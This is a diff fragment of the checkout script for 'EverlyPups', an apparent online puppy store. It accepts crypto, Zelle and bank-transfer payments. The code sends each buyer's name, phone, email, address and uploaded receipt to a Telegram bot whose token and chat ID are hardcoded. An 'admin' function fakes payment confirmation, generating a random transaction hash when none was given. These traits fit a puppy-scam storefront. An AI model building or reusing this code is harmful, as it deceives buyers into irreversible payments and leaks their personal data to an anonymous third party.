+      if (e.target.files.length > 0) {
+        processFile(e.target.files[0]);
+      }
+    }
+
+    function processFile(file) {
+      const errorDiv = document.getElementById('receiptValidationError');
+      const previewBox = document.getElementById('filePreviewBox');
+      const fileNameText = document.getElementById('fileNameText');
+      const fileSizeText = document.getElementById('fileSizeText');
+      const fileTypeIcon = document.getElementById('fileTypeIcon');
+
+      errorDiv.style.display = 'none';
+
+      // Validation 1: Size (10MB)
+      const maxSize = 10 * 1024 * 1024;
+      if (file.size > maxSize) {
+        showUploadError("File size must be 10 MB or less.");
+        return;
+      }
+
+      // Validation 2: Format
+      const allowedExtensions = ['jpg', 'jpeg', 'png', 'pdf'];
+      const fileExtension = file.name.split('.').pop().toLowerCase();
+      if (!allowedExtensions.includes(fileExtension)) {
+        showUploadError("Please upload a JPG, PNG, or PDF file.");
+        return;
+      }
+
+      // Save file reference
+      uploadedFile = file;
+
+      // Update Preview UI
+      fileNameText.textContent = file.name;
+      fileSizeText.textContent = formatFileSize(file.size);
+
+      if (fileExtension === 'pdf') {
+        fileTypeIcon.className = "fa-regular fa-file-pdf";
+        fileTypeIcon.style.color = "#EF4444";
+      } else {
+        fileTypeIcon.className = "fa-regular fa-file-image";
+        fileTypeIcon.style.color = "#3B82F6";
+      }
+
+      document.getElementById('dragDropArea').style.display = 'none';
+      previewBox.style.display = 'flex';
+    }
+
+    function showUploadError(msg) {
+      const errorDiv = document.getElementById('receiptValidationError');
+      const errorMsg = document.getElementById('receiptErrorMsg');
+      errorMsg.textContent = msg;
+      errorDiv.style.display = 'flex';
+      
+      uploadedFile = null;
+      document.getElementById('receiptFileInput').value = '';
+    }
+
+    function removeUploadedFile(e) {
+      if (e && typeof e.stopPropagation === 'function') {
+        e.stopPropagation();
+      }
+      uploadedFile = null;
+      document.getElementById('receiptFileInput').value = '';
+      
+      document.getElementById('filePreviewBox').style.display = 'none';
+      document.getElementById('dragDropArea').style.display = 'block';
+      document.getElementById('receiptValidationError').style.display = 'none';
+    }
+
+    function formatFileSize(bytes) {
+      if (bytes === 0) return '0 Bytes';
+      const k = 1024;
+      const dm = 2;
+      const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+      const i = Math.floor(Math.log(bytes) / Math.log(k));
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+    }
+
+    async function sendTelegramCryptoAlert(file, tokenSymbol, tokenName, txId) {
+      if (TELEGRAM_BOT_TOKEN.includes('YOUR_') || TELEGRAM_CHAT_ID.includes('YOUR_')) {
+        console.log("Telegram alert skipped: placeholders not configured.");
+        return;
+      }
+
+      if (!file) {
+        console.error("sendTelegramCryptoAlert called with null file.");
+        return;
+      }
+
+      const customer = JSON.parse(localStorage.getItem('everlypups_checkout_details') || '{}');
+      const delivery = JSON.parse(localStorage.getItem('everlypups_checkout_delivery') || '{}');
+      
+      const buyerName = `${customer.firstName || ''} ${customer.lastName || ''}`;
+      const phone = customer.phone || 'N/A';
+      const email = customer.email || 'N/A';
+      const address = delivery.locationText || 'N/A';
+      const puppyName = activePuppy ? activePuppy.name : 'Finn';
+      const amount = activePuppy ? activePuppy.price.toLocaleString() + '.00' : '2,890.00';
+      
+      const text = `🚨 NEW EVERLYPUPS CRYPTO ORDER!\n\n` +
+                   `👤 Customer: ${buyerName}\n` +
+                   `📞 Phone: ${phone}\n` +
+                   `✉️ Email: ${email}\n` +
+                   `🐶 Puppy: ${puppyName}\n` +
+                   `💰 Amount: $${amount}\n` +
+                   `🏠 Address: ${address}\n` +
+                   `🪙 Coin: ${tokenName} (${tokenSymbol})\n` +
+                   `🔗 Tx ID: ${txId || 'Not Provided'}`;
+
+      // 1. Send the text notification first (instant and guaranteed)
+      const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+      try {
+        await fetch(textUrl);
+      } catch (e) {
+        console.error("Failed to send Telegram crypto text alert", e);
+      }
+
+      // 2. Send the document or photo screenshot file as a second message
+      const fileExtension = file.name.split('.').pop().toLowerCase();
+      const isImage = ['jpg', 'jpeg', 'png'].includes(fileExtension);
+      const endpoint = isImage ? 'sendPhoto' : 'sendDocument';
+      
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append(isImage ? 'photo' : 'document', file);
+      formData.append('caption', `Receipt file for ${buyerName} (${puppyName})`);
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${endpoint}`, {
+          method: 'POST',
+          body: formData
+        });
+        const result = await response.json();
+        console.log(`Telegram ${endpoint} result:`, result);
+        if (!response.ok) {
+          alert(`Telegram Photo/Document Upload Failed: ${result.description}`);
+        }
+      } catch (e) {
+        console.error("Failed to send Telegram crypto receipt document", e);
+      }
+    }
+
+    async function submitReceiptForVerification() {
+      // Validate upload
+      if (!uploadedFile) {
+        showUploadError("Please upload your payment receipt before submitting.");
+        return;
+      }
+
+      const fileToUpload = uploadedFile; // Cache file reference before modal reset clears it
+
+      const txId = document.getElementById('txIdInput').value.trim();
+      let displayTxId = "Not Provided";
+      if (txId) {
+        if (txId.length > 12) {
+          displayTxId = txId.slice(0, 8) + "..." + txId.slice(-4);
+        } else {
+          displayTxId = txId;
+        }
+      }
+
+      closeReceiptModal();
+
+      const option = document.querySelector(`.custom-select-option.selected`);
+      const tokenSymbol = option ? option.getAttribute('data-symbol') : 'BTC';
+      const tokenName = option ? option.textContent.split(' ')[0] : 'Bitcoin';
+
+      // Update Under Review Card details
+      document.getElementById('underReviewToken').textContent = tokenName + " (" + tokenSymbol + ")";
+      document.getElementById('underReviewTxId').textContent = displayTxId;
+      if (activePuppy) {
+        document.getElementById('underReviewAmount').textContent = "$" + activePuppy.price.toLocaleString() + ".00";
+      }
+
+      // Store transaction values globally for the administrator simulation
+      window.lastSubmittedTx = {
+        tokenName: tokenName,
+        tokenSymbol: tokenSymbol,
+        displayTxId: displayTxId
+      };
+
+      setCryptoState('verification'); // Activates Verification step in stepper & displays under-review view
+
+      // Send Telegram alerts asynchronously in the background so it doesn't block the UI
+      sendTelegramCryptoAlert(fileToUpload, tokenSymbol, tokenName, txId);
+    }
+
+    function adminVerifyPayment() {
+      const txInfo = window.lastSubmittedTx || {
+        tokenName: 'Bitcoin',
+        tokenSymbol: 'BTC',
+        displayTxId: 'Not Provided'
+      };
+
+      // Set confirmed card info
+      document.getElementById('confirmedToken').textContent = txInfo.tokenName + " (" + txInfo.tokenSymbol + ")";
+      document.getElementById('confirmedTxId').textContent = txInfo.displayTxId !== "Not Provided" ? txInfo.displayTxId : "0x" + Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('').slice(0, 8) + "...";
+      
+      if (activePuppy) {
+        document.getElementById('confirmedAmountUsd').textContent = "$" + activePuppy.price.toLocaleString() + ".00";
+      }
+      
+      setCryptoState('confirmed');
+    }
+
+    function retryCryptoPayment() {
+      setCryptoState('awaiting');
+    }
+
+    // Configure your Telegram Bot alerts here:
+    const TELEGRAM_BOT_TOKEN = '8583802219:AAGzLNKebuJgfYzKftyVliyS-xOYTZvOwW8';
+    const TELEGRAM_CHAT_ID = '7180212588';
+
+    async function sendTelegramAlert(paymentMethod) {
+      if (TELEGRAM_BOT_TOKEN.includes('YOUR_') || TELEGRAM_CHAT_ID.includes('YOUR_')) {
+        console.log("Telegram alert skipped: placeholders not configured.");
+        return;
+      }
+      
+      const customer = JSON.parse(localStorage.getItem('everlypups_checkout_details') || '{}');
+      const delivery = JSON.parse(localStorage.getItem('everlypups_checkout_delivery') || '{}');
+      
+      const buyerName = `${customer.firstName || ''} ${customer.lastName || ''}`;
+      const phone = customer.phone || 'N/A';
+      const email = customer.email || 'N/A';
+      const address = delivery.locationText || 'N/A';
+      const puppyName = activePuppy ? activePuppy.name : 'Finn';
+      const amount = activePuppy ? activePuppy.price.toLocaleString() + '.00' : '2,890.00';
+      
+      const text = `🚨 NEW EVERLYPUPS ORDER!\n\n` +
+                   `👤 Customer: ${buyerName}\n` +
+                   `📞 Phone: ${phone}\n` +
+                   `✉️ Email: ${email}\n` +
+                   `🐶 Puppy: ${puppyName}\n` +
+                   `💰 Amount: $${amount}\n` +
+                   `🏠 Address: ${address}\n` +
+                   `🏦 Method: ${paymentMethod}\n\n` +
+                   `👉 Please check your WhatsApp or email to contact the buyer!`;
+                    
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+      
+      try {
+        await fetch(url);
+      } catch (e) {
+        console.error("Failed to send Telegram alert", e);
+      }
+    }
+
+    async function submitZelleSent() {
+      const btn = document.getElementById('btnSentZelle');
+      const originalText = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending Instructions...';
+
+      // Send the Telegram alert
+      await sendTelegramAlert('Zelle');
+
+      btn.disabled = false;
+      btn.innerHTML = originalText;
+      
+      document.getElementById('zelleAwaitingState').style.display = 'none';
+      document.getElementById('zelleSentState').style.display = 'block';
+      
+      // Stepper stays at Awaiting Payment active
+      resetStepperToAwaiting();
+    }
+
+    async function submitBankSent() {
+      const btn = document.getElementById('btnSentBank');
+      const originalText = btn.innerHTML;
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sending Instructions...';
+
+      // Send the Telegram alert
+      await sendTelegramAlert('Bank Transfer');
+
+      btn.disabled = false;
+      btn.innerHTML = originalText;
+      
+      document.getElementById('bankAwaitingState').style.display = 'none';
+      document.getElementById('bankSentState').style.display = 'block';
+      
+      // Stepper stays at Awaiting Payment active
+      resetStepperToAwaiting();
+    }
+
+    // Global listener to close options
+    document.addEventListener('click', () => {
+      document.querySelectorAll('.custom-select-dropdown').forEach(d => {
+        d.style.display = 'none';
+        const c = d.closest('.custom-select-container');
+        const w = d.closest('.input-wrapper');
+        if (c) c.classList.remove('open');
+        if (w) w.classList.remove('open');
+      });
+    });
+  </script>
+</body>
+</html>
